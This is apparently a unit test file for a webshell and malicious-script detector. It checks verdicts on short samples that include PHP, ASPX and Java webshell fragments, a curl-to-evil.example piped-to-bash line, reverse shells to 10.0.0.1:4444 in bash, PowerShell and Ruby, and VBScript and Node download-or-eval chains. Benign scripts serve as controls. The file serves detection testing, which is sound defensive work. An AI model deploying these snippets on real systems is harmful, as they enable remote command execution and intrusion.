import unittest

from shellsentry.core.artifact_router import route_text
from shellsentry.core.behavior_analyzer import (
    MAX_EVIDENCE_PER_PATTERN,
    analyze_behaviors,
    deterministic_verdict,
)


def _findings_for(code, filename):
    return analyze_behaviors(code, route_text(filename, code))


class BehaviorEvidenceTests(unittest.TestCase):
    def test_multiple_execution_sinks_are_all_recorded(self):
        code = "<?php\n$a = $_GET['x'];\nsystem($a);\nexec($a);\npassthru($a);\n?>"
        findings = _findings_for(code, "multi.php")
        chain = next(f for f in findings if f.finding_id == "BEHAV-EXEC-CHAIN")

        execs = [e for e in chain.evidence if e.rule_id == "FLOW-EXEC"]
        self.assertGreater(len(execs), 1)
        self.assertLessEqual(len(execs), MAX_EVIDENCE_PER_PATTERN)
        self.assertEqual([e.line_start for e in execs], [3, 4, 5])

    def test_multiple_input_sources_are_all_recorded(self):
        code = "<?php\n$a = $_GET['x'];\n$b = $_POST['y'];\nsystem($a);\n?>"
        chain = next(f for f in _findings_for(code, "src.php") if f.finding_id == "BEHAV-EXEC-CHAIN")
        sources = [e for e in chain.evidence if e.rule_id == "FLOW-SOURCE"]
        self.assertEqual(len(sources), 2)

    def test_evidence_count_is_capped(self):
        sinks = "\n".join("system($a);" for _ in range(10))
        code = "<?php\n$a = $_GET['x'];\n%s\n?>" % sinks
        chain = next(f for f in _findings_for(code, "many.php") if f.finding_id == "BEHAV-EXEC-CHAIN")
        execs = [e for e in chain.evidence if e.rule_id == "FLOW-EXEC"]
        self.assertLessEqual(len(execs), MAX_EVIDENCE_PER_PATTERN)

    def test_verdict_is_unchanged_for_single_sink_sample(self):
        code = "<?php\n$a = $_GET['x'];\nsystem($a);\n?>"
        findings = _findings_for(code, "single.php")
        verdict = deterministic_verdict(findings, {"matches": []})

        self.assertEqual(verdict.verdict, "malicious")
        self.assertEqual(verdict.reason, "外部输入到动态执行行为链")

    def test_no_behavior_chain_for_benign_code(self):
        findings = _findings_for("<?php echo 'hello'; ?>", "clean.php")
        self.assertEqual(findings, [])


class CrossLanguagePrimitiveTests(unittest.TestCase):
    """P3 第一批：补齐 .NET / PowerShell / Shell 侧此前完全脱钩的执行与解码原语。

    这三个样本在补齐前均为 no_indication/10（本地层完全看不见危险）；
    补齐后应各自形成行为链并判 malicious。
    """

    def test_dotnet_process_instance_is_recognized_as_execution(self):
        code = (
            '<%\n'
            'System.Diagnostics.Process p = new System.Diagnostics.Process();\n'
            'p.StartInfo.FileName = "cmd.exe";\n'
            'p.StartInfo.Arguments = "/c " + Request["c"];\n'
            'p.Start();\n'
            '%>'
        )
        findings = [f.finding_id for f in _findings_for(code, "cmd.aspx")]
        self.assertIn("BEHAV-EXEC-CHAIN", findings)
        verdict = deterministic_verdict(_findings_for(code, "cmd.aspx"), {"matches": []})
        self.assertEqual(verdict.verdict, "malicious")

    def test_dotnet_timer_start_is_not_treated_as_process_execution(self):
        """泛化的 `.Start()` 会误命中 timer.Start()，因此不得纳入 EXECUTION。"""
        code = "var timer = new Timer(1000);\ntimer.Start();"
        self.assertEqual(_findings_for(code, "svc.cs"), [])

    def test_powershell_encoded_command_forms_execution_chain(self):
        code = (
            "powershell.exe -EncodedCommand JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0"
            "AC4AVwBlAGIAQwBsAGkAZQBuAHQALgBEAE8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA="
        )
        findings = [f.finding_id for f in _findings_for(code, "enc.ps1")]
        self.assertIn("BEHAV-OBF-EXEC", findings)
        verdict = deterministic_verdict(_findings_for(code, "enc.ps1"), {"matches": []})
        self.assertEqual(verdict.verdict, "malicious")

    def test_shell_piped_interpreter_forms_download_chain(self):
        code = "#!/bin/bash\ncurl -s http://evil.example/p.sh | base64 -d | bash"
        ids = [f.finding_id for f in _findings_for(code, "dl.sh")]
        self.assertIn("BEHAV-DOWNLOAD-EXEC", ids)
        self.assertIn("BEHAV-OBF-EXEC", ids)
        verdict = deterministic_verdict(_findings_for(code, "dl.sh"), {"matches": []})
        self.assertEqual(verdict.verdict, "malicious")

    def test_shell_backup_script_is_not_flagged(self):
        """补齐后的新词不得把常规 Shell 脚本抬高风险（尤其不能放宽 SHELL 认裸 bash）。"""
        code = (
            "#!/bin/bash\nset -euo pipefail\n"
            'tar -czf "$DST/www.tgz" /var/www\n'
            "find /backup -type f -mtime +30 -delete"
        )
        self.assertEqual(_findings_for(code, "backup.sh"), [])

    def test_powershell_admin_script_is_not_flagged(self):
        code = (
            "Get-Process | Where-Object { $_.CPU -gt 100 } | Sort-Object CPU -Descending\n"
            "Get-Service | Where-Object { $_.Status -eq 'Running' } | Export-Csv a.csv"
        )
        self.assertEqual(_findings_for(code, "admin.ps1"), [])


class TaintedPrimitiveTests(unittest.TestCase):
    """P3 第二批：条件性次级原语。

    核心约束——newInstance / defineClass / invoke / create_function / Cipher /
    BASE64Decoder / openssl_decrypt / b64decode 单独出现几乎都是良性的
    （工厂模式、加密库、编码工具），因此**仅在存在外部输入时**才计入行为链。
    以下两组断言分别覆盖「有外部输入 → 必须抓到」与「无外部输入 → 必须放过」。
    """

    # ── 有外部输入：必须形成行为链 ──
    def test_java_memshell_with_external_input_is_malicious(self):
        code = (
            "String k = request.getParameter(\"c\");\n"
            "byte[] b = java.util.Base64.getDecoder().decode(k);\n"
            "Class<?> c = Class.forName(\"payload.P\");\n"
            "Object o = c.newInstance();\n"
        )
        ids = [f.finding_id for f in _findings_for(code, "Evil.java")]
        self.assertIn("BEHAV-EXEC-CHAIN", ids)
        self.assertIn("BEHAV-OBF-EXEC", ids)

    def test_php_godzilla_style_payload_is_malicious(self):
        code = (
            "<?php\n"
            "$data = file_get_contents(\"php://input\");\n"
            "$data = openssl_decrypt($data, \"AES128\", $key);\n"
            "$fn = create_function(\"\", $data);\n"
            "$fn();\n"
            "?>"
        )
        ids = [f.finding_id for f in _findings_for(code, "god.php")]
        self.assertIn("BEHAV-EXEC-CHAIN", ids)

    def test_python_wsgi_shell_is_malicious(self):
        code = (
            "import base64\n"
            "def application(environ, start_response):\n"
            "    cmd = environ.get('HTTP_X_CMD')\n"
            "    exec(base64.b64decode(cmd))\n"
        )
        ids = [f.finding_id for f in _findings_for(code, "w.py")]
        self.assertIn("BEHAV-EXEC-CHAIN", ids)

    # ── 无外部输入：必须放过（这些是补词最容易误伤的良性形态）──
    def test_java_factory_pattern_is_not_flagged(self):
        """工厂模式 newInstance() 无外部输入，不得被抬为行为链。"""
        code = (
            "public class PluginFactory {\n"
            "    public Plugin create(String name) throws Exception {\n"
            "        Class<?> k = Class.forName(name);\n"
            "        return (Plugin) k.newInstance();\n"
            "    }\n"
            "}"
        )
        self.assertEqual(_findings_for(code, "Factory.java"), [])

    def test_java_crypto_utility_is_not_flagged(self):
        """加密工具 Cipher/SecretKeySpec 无外部输入，不得被抬为行为链。"""
        code = (
            "public class AesUtil {\n"
            "    public byte[] enc(byte[] d, SecretKeySpec key) throws Exception {\n"
            "        Cipher c = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n"
            "        c.init(Cipher.ENCRYPT_MODE, key);\n"
            "        return c.doFinal(d);\n"
            "    }\n"
            "}"
        )
        self.assertEqual(_findings_for(code, "AesUtil.java"), [])

    def test_php_crypto_library_is_not_flagged(self):
        code = (
            "<?php\n"
            "class Crypto {\n"
            "    public function encrypt($data, $key) {\n"
            "        return openssl_encrypt($data, 'AES-256-CBC', $key, 0, $iv);\n"
            "    }\n"
            "    public function decode($s) { return base64_decode($s); }\n"
            "}\n"
            "?>"
        )
        self.assertEqual(_findings_for(code, "C.php"), [])

    def test_python_base64_utility_is_not_flagged(self):
        code = (
            "import base64, json\n"
            "def enc(p): return base64.urlsafe_b64encode(json.dumps(p).encode())\n"
            "def dec(s): return json.loads(base64.b64decode(s))\n"
        )
        self.assertEqual(_findings_for(code, "u.py"), [])


class BatchThreeDialectTests(unittest.TestCase):
    """P3 第三批：多方言零链样本的补词效果与误报防线。"""

    def _ids(self, code, filename):
        return [f.finding_id for f in _findings_for(code, filename)]

    def test_dotnet_reflective_assembly_load_forms_chain(self):
        """冰蝎 ASPX：Request 输入 → Base64/AES 还原 → Assembly.Load 实例化。"""
        code = (
            'string pass = Request.Form["pass"];\n'
            "byte[] data = Convert.FromBase64String(pass);\n"
            "byte[] dec = aes.CreateDecryptor().TransformFinalBlock(data, 0, data.Length);\n"
            "System.Reflection.Assembly.Load(dec).CreateInstance(\"Evil\");\n"
        )
        ids = self._ids(code, "s.aspx")
        self.assertIn("BEHAV-EXEC-CHAIN", ids)
        self.assertIn("BEHAV-OBF-EXEC", ids)

    def test_powershell_reverse_shell_forms_chain(self):
        """远端流读取 → iex（无括号写法）执行。"""
        code = (
            '$client = New-Object System.Net.Sockets.TCPClient("10.0.0.1",4444)\n'
            "$stream = $client.GetStream()\n"
            "$bytes = $stream.Read($buffer, 0, $buffer.Length)\n"
            "iex $data\n"
        )
        self.assertIn("BEHAV-EXEC-CHAIN", self._ids(code, "rs.ps1"))

    def test_bash_dev_tcp_reverse_shell_forms_chain(self):
        code = "#!/bin/bash\nexec 5<>/dev/tcp/10.0.0.1/4444\ncat <&5\n"
        self.assertIn("BEHAV-REVERSE-SHELL", self._ids(code, "rs.sh"))

    def test_perl_cgi_param_forms_chain(self):
        code = ("my $q = CGI->new;\n"
                "my $cmd = $q->param('cmd');\n"
                "system($cmd);\n")
        self.assertIn("BEHAV-EXEC-CHAIN", self._ids(code, "cmd.pl"))

    def test_ruby_socket_read_to_popen_forms_chain(self):
        code = ("require 'socket'\n"
                "s = TCPSocket.new(\"10.0.0.1\", 4444)\n"
                "while cmd = s.gets\n"
                "  IO.popen(cmd, \"r\") { |io| s.write(io.read) }\n"
                "end\n")
        self.assertIn("BEHAV-EXEC-CHAIN", self._ids(code, "rs.rb"))

    def test_vbscript_download_and_run_forms_chain(self):
        """VBScript 无括号过程调用 `oShell.Run "cmd …"` 必须被识别。"""
        code = (
            'Set oHttp = CreateObject("MSXML2.XMLHTTP")\n'
            'oHttp.Open "GET", sUrl, False\n'
            "oHttp.Send\n"
            'Set oShell = CreateObject("WScript.Shell")\n'
            'oShell.Run "cmd.exe /c " & oHttp.responseText\n'
        )
        self.assertIn("BEHAV-DOWNLOAD-EXEC", self._ids(code, "dl.vbs"))

    def test_node_request_body_to_eval_forms_chain(self):
        code = ("req.on('data', d => body += d);\n"
                "const c = crypto.createDecipheriv('aes-128-cbc', key, iv);\n"
                "eval(c.update(body, 'base64', 'utf8'));\n")
        ids = self._ids(code, "w.js")
        self.assertIn("BEHAV-EXEC-CHAIN", ids)
        self.assertIn("BEHAV-OBF-EXEC", ids)

    # ── 误报防线 ──
    def test_ruby_ops_script_with_socket_and_popen_is_not_reverse_shell(self):
        """端口探测 + 执行命令的运维脚本：有网络与命令能力，但无远端输入驱动。"""
        code = ("require 'socket'\nrequire 'open3'\n"
                "s = TCPSocket.new('10.0.0.5', 22)\n"
                "s.close\n"
                "out, err, st = Open3.capture3('uptime')\n"
                "puts out\n")
        self.assertEqual(_findings_for(code, "check.rb"), [])

    def test_bash_deploy_script_with_curl_is_not_flagged(self):
        code = ("#!/bin/bash\n"
                "curl -sSL https://example.com/app.tar.gz -o /tmp/app.tar.gz\n"
                "tar -xzf /tmp/app.tar.gz -C /opt/app\n"
                "systemctl restart app\n")
        self.assertEqual(_findings_for(code, "deploy.sh"), [])

    def test_ruby_file_read_is_not_treated_as_external_input(self):
        """无网络通道时 `fh.gets` 只是读文件，不得计入外部输入。"""
        code = ("fh = File.open('app.log')\n"
                "while line = fh.gets\n"
                "  puts line\n"
                "end\n")
        self.assertEqual(_findings_for(code, "read.rb"), [])

    def test_plain_vbscript_file_cleanup_is_not_flagged(self):
        code = ('Set fso = CreateObject("Scripting.FileSystemObject")\n'
                'Set folder = fso.GetFolder("C:\\\\temp")\n'
                "For Each f In folder.Files\n"
                "  f.Delete\n"
                "Next\n")
        self.assertEqual(_findings_for(code, "clean.vbs"), [])


if __name__ == "__main__":
    unittest.main()
